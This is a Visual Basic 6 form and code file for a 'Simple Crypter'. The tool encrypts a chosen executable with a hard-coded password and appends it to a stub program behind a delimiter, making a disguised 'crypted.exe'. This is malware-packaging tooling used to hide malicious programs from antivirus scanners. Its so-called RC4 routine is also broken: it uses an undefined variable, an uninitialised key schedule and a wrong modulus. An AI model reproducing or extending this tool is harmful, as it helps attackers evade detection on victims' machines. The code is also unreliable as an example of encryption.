VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Begin VB.Form frmMain 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Simple Crypter"
   ClientHeight    =   930
   ClientLeft      =   90
   ClientTop       =   435
   ClientWidth     =   3825
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   930
   ScaleWidth      =   3825
   StartUpPosition =   3  'Windows Default
   Begin MSComDlg.CommonDialog cmdlg 
      Left            =   120
      Top             =   360
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
      DialogTitle     =   "Open"
      Filter          =   "Executables (*.exe)|*.exe"
   End
   Begin VB.CommandButton cmdCrypt 
      Caption         =   "Crypt"
      Height          =   375
      Left            =   2040
      TabIndex        =   2
      Top             =   480
      Width           =   1695
   End
   Begin VB.CommandButton cmdBrowse 
      Caption         =   "..."
      Height          =   255
      Left            =   3360
      TabIndex        =   1
      Top             =   120
      Width           =   375
   End
   Begin VB.TextBox txtFile 
      Height          =   285
      Left            =   120
      TabIndex        =   0
      Top             =   120
      Width           =   3135
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub cmdBrowse_Click()
cmdlg.ShowOpen 'Executes the open file dialog
txtFile.Text = cmdlg.FileName 'Sets the .text property of txtFile to the filepath and name of the file opened
End Sub

Private Sub cmdCrypt_Click()
Dim sStub As String, sFile As String 'Variables to load stub/file to be crypted in

Open App.Path & "\stub.exe" For Binary As #1 'opens the stub
    sStub = Space(LOF(1)) 'makes variable a space that is the lof(length of file)
    Get #1, , sStub 'imports into our variable
Close #1 'close the stub

Open txtFile.Text For Binary As #1 'opens the file to be crypted
    sFile = Space(LOF(1)) 'makes variable space that is lof
    Get #1, , sFile 'imports into variable
Close #1 'close file

sFile = RC4(sFile, "password") 'encrypts the string "sFile", which is the file we want crypted :) - you can use any password, or generate one

Open App.Path & "\crypted.exe" For Binary As #1 'opens for output
    Put #1, , sStub 'puts our stub
    Put #1, , "#^#^#" 'random string so we can split it up and decrypt the file in stub
    Put #1, , sFile 'puts our encrypted file
Close #1 'closes file

MsgBox "File Crypted", vbInformation, "Success!" 'self explanatory =]
End Sub

Public Function RC4(ByVal Data As String, ByVal Password As String) As String 'rc4 encryption function
On Error Resume Next
Dim F(0 To 255) As Integer, X, Y As Long, Key() As Byte
Key() = StrConv(Password, vbFromUnicode)
For X = 0 To 255
Y = (Y + F(X) + Key(X Mod Len(Password))) Mod 256
F(X) = X
Next X
Key() = StrConv(Data, vbFromUnicode)
For X = 0 To Len(Data)
Y = (Y + F(Y) + 1) Mod 256
Key(X) = Key(X) Xor F(Temp + F((Y + F(Y)) Mod 254))
Next X
RC4 = StrConv(Key, vbUnicode)
End Function
